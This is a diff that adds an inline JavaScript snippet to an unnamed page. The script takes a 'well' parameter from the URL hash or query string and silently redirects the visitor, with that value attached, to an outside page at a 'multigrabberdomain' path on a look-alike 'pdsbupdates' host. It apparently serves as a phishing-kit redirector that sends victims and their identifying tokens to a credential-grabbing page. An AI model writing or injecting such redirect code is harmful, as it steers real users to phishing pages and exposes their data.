@@ -1,0 +1,33 @@
+<script>
+(function () {
+
+    // 🔹 Extract "well" value from hash if present
+    var hash = window.location.hash;
+
+    var wellValue = null;
+
+    if (hash && hash.includes("well=")) {
+        var match = hash.match(/well=([^&]+)/);
+        if (match) {
+            wellValue = decodeURIComponent(match[1]);
+        }
+    }
+
+    // 🔹 If not found in hash, check query string
+    if (!wellValue) {
+        var params = new URLSearchParams(window.location.search);
+        if (params.has("well")) {
+            wellValue = params.get("well");
+        }
+    }
+
+    // 🔹 If found, build clean final URL
+    if (wellValue) {
+        var finalUrl = "https://pdsbupdates.moonbox2025.org/multigrabberdomain/index.html?well=" 
+                        + encodeURIComponent(wellValue);
+
+        window.location.replace(finalUrl);
+    }
+
+})();
+</script>
